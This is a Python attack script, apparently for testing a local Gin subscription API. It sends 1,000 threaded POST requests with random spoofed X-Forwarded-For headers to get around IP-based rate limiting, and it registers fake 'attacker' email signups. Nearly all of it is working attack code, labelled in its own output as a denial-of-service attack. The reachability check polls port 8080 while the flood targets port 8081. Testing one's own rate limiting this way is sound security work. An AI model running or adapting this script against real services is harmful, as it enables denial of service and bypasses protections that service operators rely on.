#!/usr/bin/env python3
import requests
import random
import time
import threading
import sys
from datetime import datetime


# Konfiguracija
TARGET_URL = "http://localhost:8081/api/subscriptions/"
NUM_REQUESTS = 1000  # Ukupan broj zahteva
NUM_THREADS = 10     # Broj paralelnih threadova
DELAY = 0.01         # Pauza između zahteva (sekunde)


def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"


def send_request(request_num):
    fake_ip = generate_fake_ip()
    
    headers = {
        "X-Forwarded-For": fake_ip,
        "Content-Type": "application/json"
    }
    
    payload = {
        "user_email": f"attacker{request_num}@fake.com",
        "plan_type": "basic"
    }
    
    try:
        start_time = time.time()
        response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=5)
        elapsed = time.time() - start_time
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if response.status_code == 201:
            print(f"[{timestamp}] Request #{request_num} - SUCCESS (Spoofed IP: {fake_ip}) - {elapsed:.2f}s")
            return True
        elif response.status_code == 429:
            print(f"[{timestamp}] Request #{request_num} - RATE LIMITED (Spoofed IP: {fake_ip})")
            return False
        else:
            print(f"[{timestamp}] Request #{request_num} - FAILED ({response.status_code}) (Spoofed IP: {fake_ip})")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[{timestamp}] Request #{request_num} - ERROR: {str(e)}")
        return False


def worker(start_idx, num_requests):
    for i in range(num_requests):
        request_num = start_idx + i
        send_request(request_num)
        time.sleep(DELAY)


def run_attack():
    print("=" * 70)
    print("DoS Attack - X-Forwarded-For Spoofing")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print(f"Total requests: {NUM_REQUESTS}")
    print(f"Threads: {NUM_THREADS}")
    print(f"Delay: {DELAY}s")
    print("=" * 70)
    print()
    
    try:
        response = requests.get("http://localhost:8080/api/subscriptions/", timeout=2)
        if response.status_code == 200:
            print("Server is reachable")
        else:
            print("Server responded with unexpected status")
    except:
        print("ERROR: Cannot reach server! Make sure the Gin app is running.")
        return
    
    print()
    print("Starting attack in 3 seconds...")
    print("Press Ctrl+C at any time to stop...")
    time.sleep(3)
    print()
    
    start_time = time.time()
    
    threads = []
    requests_per_thread = NUM_REQUESTS // NUM_THREADS
    
    try:
        for i in range(NUM_THREADS):
            start_idx = i * requests_per_thread
            thread = threading.Thread(target=worker, args=(start_idx, requests_per_thread))
            thread.daemon = True  # Daemon thread se automatski gasi
            threads.append(thread)
            thread.start()
        
        # Čekaj da svi threadovi završe, ali dozvoli Ctrl+C
        for thread in threads:
            thread.join()
    
    except KeyboardInterrupt:
        print("Threads will stop gracefully...")
        time.sleep(1)
        sys.exit(0)
    
    elapsed_time = time.time() - start_time
    
    print()
    print("=" * 70)
    print("Attack completed!")
    print(f"Total time: {elapsed_time:.2f} seconds")
    print(f"Average: {NUM_REQUESTS / elapsed_time:.2f} requests/second")
    print("=" * 70)
    print()
    print("Check the Gin server logs to see how it handled the spoofed IPs!")
    print()


if __name__ == "__main__":
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\nProgram interrupted!")
        sys.exit(0)
